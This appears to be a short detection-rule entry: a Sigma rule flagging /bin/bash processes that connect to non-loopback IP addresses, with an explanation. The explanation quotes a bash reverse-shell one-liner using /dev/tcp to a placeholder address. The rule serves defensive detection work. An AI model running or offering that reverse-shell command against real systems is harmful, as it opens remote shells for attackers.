query: "# Sigma Detection Logic\n# Convert to platform-specific query using Sigma\
  \ tools:\n# https://github.com/SigmaHQ/sigma\n\ncondition: selection and not filter\n\
  filter:\n  DestinationIp:\n  - 127.0.0.1\n  - 0.0.0.0\nselection:\n  Image|endswith:\
  \ /bin/bash\n"
explanation: Detects a bash contecting to a remote IP address (often found when actors
  do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')
